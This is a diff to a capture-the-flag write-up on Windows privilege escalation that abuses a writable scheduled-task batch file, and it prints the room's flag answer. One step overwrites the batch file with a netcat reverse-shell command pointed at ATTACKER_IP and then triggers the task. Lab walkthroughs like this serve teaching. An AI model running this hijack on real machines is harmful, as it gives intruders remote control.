@@ -106,8 +106,11 @@ Privilege escalation can be facilitated through misconfigurations, such as those
 ### Q.1: What is the taskusr1 flag?
 Let’s start by getting info on the scheduled task called “vulntask”.
 ```schtasks /query /tn vulntask /fo list /v```
+![Finding info by vulntask](images/task_to_run.png)
 
 As discussed in the task description, we can edit the file if have the correct permissions. To check these we run the following command: ```icacls c:\tasks\schtask.bat```
+![See the permissions](images/icacls_schtask.bat.png)
+We have correct permission
 
 Now all we need to do is echo the nc64 command to the schtask.bat file to overwrite its content. Remember to change the ip.
 ```echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat```
@@ -115,9 +118,14 @@ Now all we need to do is echo the nc64 command to the schtask.bat file to overwr
 And setup a listener on your attacker machine: ```nc -lvnp 4444```
 
 Finally, run the scheduled task with: ```schtasks /run /tn vulntask```
+![scheduled task](images/cmd_exc.png)
+Running the scheduled task
 
 And yes, we got a connection:
+![connected in netcat](images/got_nc_connection.png)
+We got a connection
 
 And find the flag:
-
+![Flag](images/flag_text.png)
+Another flag in the house
 #### Answer: THM{TASK_COMPLETED}
